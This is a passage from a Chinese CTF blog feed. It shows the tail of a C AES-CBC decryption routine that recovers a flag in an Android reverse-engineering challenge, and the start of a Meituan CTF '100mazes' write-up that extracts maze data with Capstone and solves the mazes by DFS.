deMixColumns(wArray);<br><br>            addRoundTowArray(cArray, wArray);<br>        &#125;<br><br>        deSubBytes(cArray);<br><br>        deShiftRows(cArray);<br><br>        addRoundKey(cArray, <span class="hljs-number">0</span>);<br><br>        convertArrayToStr(cArray, c + k);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 参数 p: 明文的字符串数组。</span><br><span class="hljs-comment"> * 参数 plen: 明文的长度。</span><br><span class="hljs-comment"> * 参数 key: 密钥的字符串数组。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">aes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">int</span> plen, <span class="hljs-keyword">char</span> *key)</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> keylen = <span class="hljs-built_in">strlen</span>(key);<br>    <span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> k,i;<br><br>    <span class="hljs-keyword">if</span>(plen == <span class="hljs-number">0</span> || plen % <span class="hljs-number">16</span> != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;明文字符长度必须为16的倍数！\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!checkKeyLen(keylen)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;密钥字符长度错误！长度必须为16。当前长度为%d\n&quot;</span>,keylen);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    extendKey(key);<span class="hljs-comment">//扩展密钥</span><br><br>    <span class="hljs-keyword">for</span>(k = <span class="hljs-number">0</span>; k &lt; plen; k += <span class="hljs-number">16</span>) &#123;<br>        convertToIntArray(p + k, pArray);<br><br>        addRoundKey(pArray, <span class="hljs-number">0</span>);<span class="hljs-comment">//一开始的轮密钥加</span><br><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br><br>            subBytes(pArray);<span class="hljs-comment">//字节代换</span><br><br>            shiftRows(pArray);<span class="hljs-comment">//行移位</span><br><br>            mixColumns(pArray);<span class="hljs-comment">//列混合</span><br><br>            addRoundKey(pArray, i);<br><br>        &#125;<br><br>        subBytes(pArray);<span class="hljs-comment">//字节代换</span><br><br>        shiftRows(pArray);<span class="hljs-comment">//行移位</span><br><br>        addRoundKey(pArray, <span class="hljs-number">10</span>);<br><br>        convertArrayToStr(pArray, p + k);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myAddRoundKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> roundKey[<span class="hljs-number">11</span>][<span class="hljs-number">16</span>], <span class="hljs-keyword">int</span> r)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] ^= roundKey[r][i * <span class="hljs-number">4</span> + j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">int</span> &amp;a, <span class="hljs-keyword">int</span> &amp;b)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> t;<br>    t = a;<br>    a = b;<br>    b = t;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myshift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> rol = <span class="hljs-number">0</span>; rol &lt; <span class="hljs-number">4</span>; rol++ )&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            tmpArr[(i + rol) % <span class="hljs-number">4</span>][rol] = pArray[i][rol];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mydeshift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> rol = <span class="hljs-number">0</span>; rol &lt; <span class="hljs-number">4</span>; rol++ )&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            tmpArr[(i - rol + <span class="hljs-number">4</span>) % <span class="hljs-number">4</span>][rol] = pArray[i][rol];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myTranspose</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            tmpArr[i][j] = pArray[j][i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">my_aes_cbc</span><span class="hljs-params">( <span class="hljs-keyword">int</span> *in_,  <span class="hljs-keyword">char</span> * out_,  <span class="hljs-keyword">int</span> * iv_)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> subkeys[<span class="hljs-number">11</span>][<span class="hljs-number">16</span>]  = &#123;<br>            <span class="hljs-number">0x31</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>,<br>            <span class="hljs-number">0x03</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF2</span>,<br>            <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x5E</span>,<br>            <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC4</span>,<br>            <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x10</span>,<br>            <span class="hljs-number">0x07</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x71</span>,<br>            <span class="hljs-number">0x21</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x0F</span>,<br>            <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x6F</span>,<br>            <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x65</span>,<br>            <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x69</span>,<br>            <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x4A</span><br>    &#125;;<br>    <span class="hljs-keyword">int</span> iv[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xAA</span>&#125;;<br>    <span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">143</span>, <span class="hljs-number">217</span>, <span class="hljs-number">87</span>, <span class="hljs-number">27</span>, <span class="hljs-number">63</span>, <span class="hljs-number">222</span>, <span class="hljs-number">90</span>, <span class="hljs-number">206</span>, <span class="hljs-number">34</span>, <span class="hljs-number">56</span>, <span class="hljs-number">58</span>, <span class="hljs-number">199</span>, <span class="hljs-number">129</span>, <span class="hljs-number">54</span>, <span class="hljs-number">208</span>, <span class="hljs-number">101</span>&#125;;<br>    <span class="hljs-comment">//convertToIntArray(in_, pArray);</span><br>    <span class="hljs-built_in">memcpy</span>(pArray, (<span class="hljs-keyword">void</span> *)in_, <span class="hljs-number">16</span> * <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(iv, (<span class="hljs-keyword">void</span> *)iv_, <span class="hljs-number">16</span> * <span class="hljs-number">4</span>);<br>   <span class="hljs-comment">// convertToIntArray(iv_, iv);</span><br><br>    printArray(pArray);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start decrypt\n&quot;</span>);<br>    myAddRoundKey(pArray, subkeys, <span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>        mydeshift(pArray);<br>        deSubBytes(pArray);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;round %d end:\n&quot;</span>, i);<br>        printArray(pArray);<br><br>        myAddRoundKey(pArray, subkeys, i);<br><br><br><br>        myTranspose(pArray);<br>        deMixColumns(pArray);<span class="hljs-comment">//列混合</span><br>        myTranspose(pArray);<br><br>    &#125;<br><br>    mydeshift(pArray);<br>    deSubBytes(pArray);<br>    myAddRoundKey(pArray, subkeys, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] ^= iv[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result:\n&quot;</span>);<br>    printArray(pArray);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            out_[i * <span class="hljs-number">4</span> + j] = pArray[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> myiv[] = &#123;<span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xAA</span>&#125;;<br>    <span class="hljs-keyword">int</span> data[] = &#123;<span class="hljs-number">143</span>, <span class="hljs-number">217</span>, <span class="hljs-number">87</span>, <span class="hljs-number">27</span>, <span class="hljs-number">63</span>, <span class="hljs-number">222</span>, <span class="hljs-number">90</span>, <span class="hljs-number">206</span>, <span class="hljs-number">34</span>, <span class="hljs-number">56</span>, <span class="hljs-number">58</span>, <span class="hljs-number">199</span>, <span class="hljs-number">129</span>, <span class="hljs-number">54</span>, <span class="hljs-number">208</span>, <span class="hljs-number">101</span>, <span class="hljs-number">219</span>, <span class="hljs-number">87</span>, <span class="hljs-number">151</span>, <span class="hljs-number">84</span>, <span class="hljs-number">99</span>, <span class="hljs-number">59</span>, <span class="hljs-number">205</span>, <span class="hljs-number">133</span>, <span class="hljs-number">66</span>, <span class="hljs-number">20</span>, <span class="hljs-number">128</span>, <span class="hljs-number">13</span>, <span class="hljs-number">168</span>, <span class="hljs-number">241</span>, <span class="hljs-number">214</span>, <span class="hljs-number">244</span>, <span class="hljs-number">77</span>, <span class="hljs-number">159</span>, <span class="hljs-number">13</span>, <span class="hljs-number">141</span>, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">143</span>, <span class="hljs-number">255</span>, <span class="hljs-number">105</span>, <span class="hljs-number">178</span>, <span class="hljs-number">73</span>, <span class="hljs-number">189</span>, <span class="hljs-number">131</span>, <span class="hljs-number">170</span>, <span class="hljs-number">104</span>, <span class="hljs-number">33</span>&#125;;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> data_out[<span class="hljs-number">49</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)&#123;<br>        my_aes_cbc(&amp;data[<span class="hljs-number">16</span> * i], (<span class="hljs-keyword">char</span> *)&amp;data_out[<span class="hljs-number">16</span> * i], myiv);<br>        <span class="hljs-built_in">memcpy</span>(myiv, &amp;data[<span class="hljs-number">16</span> * i], <span class="hljs-number">16</span> * <span class="hljs-number">4</span>);<br><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, data_out);<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Android</tag>
      
      <tag>AES</tag>
      
      <tag>AntiDebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>美团CTF: 100mazes</title>
    <link href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/"/>
    <url>/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/</url>
    
    <content type="html"><![CDATA[<h1 id="美团CTF-100mazes"><a href="#美团CTF-100mazes" class="headerlink" title="美团CTF: 100mazes"></a>美团CTF: 100mazes</h1><p>题目下载:  <a href="/2021/05/23/%E7%BE%8E%E5%9B%A2CTF-100mazes/mazes100" title="mazes100">mazes100</a><br>简单地图题，有100张地图，难点是提取地图数据，我采用 Capstone 引擎反汇编解析<br>每一张地图大小为 25 x 25 地图，地图是加密的，realMap = map1 ^ map2<br>除了提取 map1 和 map2 之外，还需要方向字符串，起点坐标</p><h2 id="map1-amp-方向字符串"><a href="#map1-amp-方向字符串" class="headerlink" title="map1 &amp; 方向字符串"></a>map1 &amp; 方向字符串</h2><p>每一个地图函数开头先赋值 map1 , 逐个字节赋值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span><span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - xxx1], xxx2<br></code></pre></td></tr></table></figure><p>一共有 625 条这样的指令。</p><p>紧接着赋值方向指令, 仍然是这个指令格式</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span><span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> - xxx1], xxx2<br></code></pre></td></tr></table></figure><p>因此，连续解析 625 + 4  条 mov    byte ptr 指令</p><h2 id="map2"><a href="#map2" class="headerlink" title="map2"></a>map2</h2><p>map2 怎么解析呢？仔细观察发现 map2 有一条 lea 指令指向，并且是相对 eip 的寻址</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xa4e6c</span>:<span class="hljs-keyword">lea</span><span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x3ed6d</span>]<br></code></pre></td></tr></table></figure><p>map2 的地址为 0xa4e6c + 0x3ed6d, 直接解析 625 个 int 即可</p><h2 id="起点坐标-x-y"><a href="#起点坐标-x-y" class="headerlink" title="起点坐标 x, y"></a>起点坐标 x, y</h2><p>观察发现，有两条 <code>mov    dword ptr [rbp + xxx], xxx</code> 赋值起点坐标，非常好解析</p><h2 id="解析必要的地图数据完整脚本"><a href="#解析必要的地图数据完整脚本" class="headerlink" title="解析必要的地图数据完整脚本"></a>解析必要的地图数据完整脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span>(<span class="hljs-params">offset</span>):</span><br>    data_bin = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;100mazes&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    data = data_bin[offset: offset + <span class="hljs-number">0x199b</span> + <span class="hljs-number">20</span>]<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    inscnt = <span class="hljs-number">0</span><br>    inscnt2 = <span class="hljs-number">0</span><br>    map1 = []<br>    map2 = []<br>    map3 = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> md.disasm(data, offset):<br>        ins = <span class="hljs-string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movbyte ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            <span class="hljs-keyword">if</span> inscnt &lt; <span class="hljs-number">629</span>:<br>                <span class="hljs-comment">#print(ins)</span><br>                map1.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;movdword ptr [rbp&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            print(ins)<br>            <span class="hljs-keyword">if</span> inscnt2 &lt; <span class="hljs-number">2</span>:<br>                map3.append(<span class="hljs-built_in">int</span>(i.op_str.split(<span class="hljs-string">&#x27;, &#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>))<br>            inscnt2 += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;learax, [rip +&#x27;</span> <span class="hljs-keyword">in</span> ins:<br>            print(ins)<br>            off1 = i.op_str[<span class="hljs-number">12</span>:-<span class="hljs-number">1</span>]<br>            off1 = <span class="hljs-built_in">int</span>(off1, <span class="hljs-number">16</span>) + i.address + <span class="hljs-number">7</span><br>            map2_data = data_bin[off1: off1 + <span class="hljs-number">4</span> * <span class="hljs-number">625</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>                map2.append(struct.unpack(<span class="hljs-string">&quot;I&quot;</span>, map2_data[i * <span class="hljs-number">4</span>: i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>])<br>    data = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">625</span>):<br>        data.append(map1[i] ^ map2[i])<br>    <span class="hljs-keyword">return</span> data, <span class="hljs-built_in">bytearray</span>(map1[-<span class="hljs-number">4</span>:]), map3<br></code></pre></td></tr></table></figure><h2 id="地图寻路"><a href="#地图寻路" class="headerlink" title="地图寻路"></a>地图寻路</h2><p>手撕一个 dfs 就出了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkValid</span>(<span class="hljs-params"><span class="hljs-built_in">map</span>, x, y</span>):</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> x &gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> y &gt; <span class="hljs-number">24</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>[y * <span class="hljs-number">25</span> + x] == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;.&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params"><span 